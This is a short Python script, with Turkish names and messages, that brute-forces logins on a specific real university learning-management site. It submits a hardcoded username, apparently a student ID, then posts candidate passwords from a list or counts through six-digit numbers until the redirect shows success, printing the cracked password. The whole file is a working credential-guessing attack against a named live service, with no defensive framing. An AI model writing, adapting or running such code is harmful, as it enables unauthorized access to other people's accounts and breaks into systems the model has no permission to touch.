from requests import *
from bs4 import BeautifulSoup as soup



class zorla:
    def __init__(self,username="",passwords = [],trylimit = False):
        self.url1 = "https://kayseriedu.almscloud.com/Account/LoginBefore?returnUrl=%2FHome%2FIndex"
        self.url2 = "https://kayseriedu.almscloud.com/?returnUrl=%2FHome%2FIndex"
        self.UserNameV = username
        self.passwordlist = passwords or False
        self.stoptrycount = trylimit
        self.randomize = False


    def Start(self):
        self.giris = Session()
        ilk = self.giris.post(self.url1, data={"UserName":self.UserNameV})
        if ilk.url != self.url1:
            print("UserName Girişi Başarılı\n")
        else:
            print("UserName Girişi Başarısız")
            exit()


    def ForceUse(self):
        count = 0
        if self.passwordlist:
            self.stoptrycount = len(self.passwordlist)
        else:
            self.randomize = True



        if self.randomize:
            self.Order = 446863

        else:
            self.Order = 0


        while True:
            if self.randomize == False:

                try:
                    self.tryingpass = self.passwordlist[count]
                    post_data2 =  {
                        "Password": self.tryingpass
                    }
                except IndexError :
                    print("Listenin içinde şifre bulunmamakta")
                    break
            else:
                post_data2 = {
                    "Password": str(self.Order)
                }


            print("Zorlanan Şifre = {}\n".format(post_data2["Password"]))
            self.sonuc = self.giris.post(self.url2, data=post_data2)

            if "Home" in self.sonuc.url :
                print("Şifre Kırıldı = {}".format(post_data2["Password"]))

                break



            if self.stoptrycount:
                if count >= self.stoptrycount:
                    print("Deneme Sayısı Tükendi")
                    break


            if len(str(self.Order)) == 7:
                print("Olası 6 Haneliler içerisinde Şifre Yok !")
                break
            self.Order += 1
            count +=1


ilktest = zorla("3010710311")
ilktest.Start()
ilktest.ForceUse()